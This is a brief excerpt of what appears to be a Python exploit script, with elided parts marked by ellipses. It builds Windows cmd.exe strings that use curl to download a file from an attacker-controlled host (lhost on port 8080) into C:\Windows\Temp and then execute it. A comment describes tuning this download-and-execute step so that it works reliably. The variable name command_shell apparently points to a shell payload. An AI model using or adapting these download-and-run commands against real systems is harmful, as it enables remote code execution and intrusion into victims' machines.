...
# Modified download_string and shell_string to make sure file has been downloaded and executed properly
...
download_string= f"cmd.exe /c curl http://{lhost}:8080/{command_shell} -o c:\Windows\Temp\{command_shell}".encode('utf-8')
...
shell_string= f"cmd.exe /c c:\Windows\Temp\{command_shell}".encode('utf-8')
